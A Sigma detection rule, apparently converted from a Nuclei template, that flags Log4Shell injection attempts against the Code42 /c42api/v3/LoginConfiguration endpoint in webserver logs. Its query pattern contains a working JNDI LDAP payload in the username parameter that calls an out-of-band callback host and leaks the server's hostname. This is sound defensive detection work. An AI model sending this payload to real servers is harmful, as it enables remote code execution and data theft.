title: Apache Code42 -  Remote Code Execution (Apache Log4j)
id: aade3579-feb8-4e78-8dbe-dc91c7771932
status: experimental
logsource:
  product: webserver
description: 'Multiple Code42 components are impacted by the logj4 vulnerability.
  Affected Code42 components include:

  - Code42 cloud: Updated Log4j from 2.15.0 to 2.17.1 on January 26, 2022

  - Code42 app for Incydr Basic and Advanced and CrashPlan Cloud product plans: Updated
  Log4j from 2.16.0 to 2.17.1 on January 18, 2022

  - Code42 User Directory Sync (UDS): Updated Log4j from 2.15.0 to 2.17.1 on February
  2, 2022

  - On-premises Code42 server: Mitigated from Log4j vulnerabilities by following these
  steps

  - On-premises Code42 app: Updated to Log4j 2.16 on December 17, 2021

  '
reference: 'Generated by converting Nuclei Template. Template ID: code42-log4j-rce
  Refer the templates here: https://github.com/projectdiscovery/nuclei-templates'
author: 'Exploit/Attack Authors: Adam Crosser; Converted to Sigma by: @pbssubhash'
date: 2024/06/23
detection:
  selection-method-1:
    cs-method: GET
  selection-paths-1:
    cs-uri-stem:
      - /c42api/v3/LoginConfiguration
  selection-query-1:
    cs-uri-query:
      - username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost
  filter-status-code-1:
    sc-status: 404
  condition: selection-method-1 and selection-paths-1 and selection-query-1 and not
    filter-status-code-1
level: low
falsepositives: Nuclei scanning, Legitimate penetration testing
